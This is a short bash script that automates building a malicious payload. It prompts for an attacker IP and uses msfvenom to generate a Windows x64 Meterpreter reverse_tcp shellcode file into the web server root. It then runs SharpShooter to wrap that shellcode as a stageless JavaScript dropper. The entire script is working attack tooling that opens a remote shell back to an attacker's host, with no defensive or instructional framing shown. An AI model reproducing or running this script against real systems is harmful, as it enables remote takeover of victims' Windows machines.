#!/bin/bash

# Prompt user for IP address
read -p "Enter LHOST IP address: " LHOST_IP

# Generate payload with msfvenom
echo "Generating payload with msfvenom..."
sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST_IP LPORT=4444 -f raw -o /var/www/html/shell.txt

# Navigate to /opt/SharpShooter
cd /opt/SharpShooter

# Execute SharpShooter with the generated payload
echo "Processing payload with SharpShooter..."
sudo python2 SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile /var/www/html/shell.txt --output test

echo "Script completed."
